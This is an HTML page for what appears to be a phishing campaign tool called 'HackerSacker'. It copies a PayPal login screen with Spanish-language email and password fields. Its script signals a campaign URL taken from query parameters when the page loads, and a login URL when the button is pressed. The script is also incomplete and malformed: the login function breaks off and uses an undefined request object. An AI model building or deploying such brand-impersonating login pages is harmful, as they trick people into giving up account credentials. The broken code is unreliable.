<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HackerSacker | Login</title>
    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="./styles/general.css">
    <script src="./js/login.js"></script>
    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script>
    <style>
        html,
        body {
            height: 100%;
            width: 100%;
            margin: 0;
        }

        body {
            display: flex;
        }

        div {
            margin: auto;
            /* nice thing of auto margin if display:flex; it center both horizontal and vertical :) */
        }
    </style>
</head>

<body class="w3-white">
    <div class="w3-container" style="display: flex; width: 100%;">
        <div class="w3-container">
            <form action="javascript:void(0);" class="w3-container w3-card-4 w3-white w3-margin" onsubmit="login()"
                style="text-align: center; padding: 40px; max-width: 1200px;">
                <h2 class="w3-center"><img src="https://newsroom.mastercard.com/wp-content/uploads/2016/09/paypal-logo.png" alt="" style="width: 100px;"></h2>
                <div class="w3-row w3-section">
                    <div class="w3-rest">
                        <input class="w3-input w3-border" name="user" type="text" placeholder="Correo electrónico o número de celular" id="usrLog" style="width: 400px;">
                    </div>
                </div>

                <div class="w3-row w3-section">
                    <div class="w3-rest">
                        <input class="w3-input w3-border" name="password" type="password" placeholder="Contraseña"
                            id="passLog">
                    </div>
                </div>

                <input type="button" class="w3-button w3-block w3-section w3-indigo w3-ripple w3-padding" 
                    value="Iniciar Sesión" onclick="loginBTN()">
            </form>

            <div class="w3-container w3-center">
                <div class="w3-rest">
                    <input class="w3-button w3-center w3-light-grey w3-ripple " name="user" type="button" value="Regístrate" style="width: 200px; height: 35px;">
                </div>
            </div>

        </div>
    </div>
</body>

<script>
    let campaignLink = "";
    let loginLink = "";
    window.onload = function () {
        const params = new URLSearchParams(window.location.search)
        for (const param of params) {
            if(param[0]=="linkcampaign"){
                campaignLink=param[1];
            }
            if(param[0]=="linklogin"){
                loginLink=param[1];
            }
        }
        let xhr = new XMLHttpRequest();
        xhr.open('PATCH',campaignLink);
        
        xhr.onload = ()=>{
            if(xhr.status != 200){
                alert(xhr.status+ ': '+ xhr.statusText + "/n Un error ha ocurrido, por favor inténtelo después.");
            }else{
                let response = JSON.parse(xhr.responseText);
            }
        }
        xhr.send();
    }
    
    function loginBTN(event){

        xhr.open('PATCH',loginLink);
        
        xhr.onload = ()=>{
            if(xhr.status != 200){
                alert(xhr.status+ ': '+ xhr.statusText + "/n Un error ha ocurrido, por favor inténtelo después.");
            }else{

</script>

</html>
